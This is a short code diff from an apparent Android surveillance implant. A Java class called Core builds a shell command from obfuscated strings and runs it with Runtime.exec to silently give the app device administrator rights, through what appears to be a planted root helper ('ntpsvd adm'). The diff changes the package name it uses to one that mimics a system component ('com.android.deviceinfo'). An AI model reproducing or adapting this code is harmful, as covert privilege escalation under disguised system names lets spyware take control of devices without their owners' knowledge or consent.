@@ -219,10 +219,10 @@ public class Core extends Activity implements Runnable {
 			// Usa la shell per prendere l'admin
 			try {
 				// /system/bin/ntpsvd adm
-				// "com.android.networking/com.android.networking.listener.AR"
+				// "com.android.deviceinfo/com.android.deviceinfo.listener.AR"
 				String pack = Status.self().getAppContext().getPackageName();
 				String bd = Messages.getString("32_43");
-				String tbe = String.format("%s %s/%s%s", bd, pack, pack, Messages.getString("32_44"));
+				String tbe = String.format("%s %s/%s", bd, pack, Messages.getString("32_44"));
 				// /system/bin/ntpsvd adm
 				// \"com.android.networking/com.android.networking.listener.AR\"
 				Runtime.getRuntime().exec(tbe);
